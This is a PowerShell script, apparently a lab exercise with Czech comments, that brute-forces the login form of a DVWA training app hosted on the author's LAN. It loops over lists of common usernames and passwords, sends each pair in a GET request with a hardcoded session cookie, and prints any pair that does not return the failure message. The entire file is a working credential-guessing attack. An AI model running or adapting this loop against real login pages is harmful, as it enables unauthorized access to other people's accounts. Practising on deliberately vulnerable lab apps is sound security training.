$usernames = @(
    "admin",
    "gordonb",
    "1337",
    "pablo",
    "smithy",
    "root",
    "user",
    "guest",
    "test",
    "administrator"
)
$passwords = @(
    "password",
    "abc123",
    "charley",
    "letmein",
    "admin",
    "123456",
    "password123",
    "qwerty",
    "root",
    "toor"
)

$cookie_string = "PHPSESSID=qc652ujddbvsf4g1422htcvui6; security=low"
$incorrect_string = "Username and/or password incorrect."

foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        # DVWA mám hostovaný na NAS v mé LAN
        $uri = "http://192.168.20.67:8080/vulnerabilities/brute/?username=$username&password=$password&Login=Login#"
        $response = Invoke-WebRequest -URI $uri -Headers @{"Cookie" = $cookie_string}

        if ($response.Content -notlike "*$incorrect_string*") {
            Write-Host "Correct login found: $username $password" -BackgroundColor Green
        }
    }
}

# Výsledek scriptu je v Output.png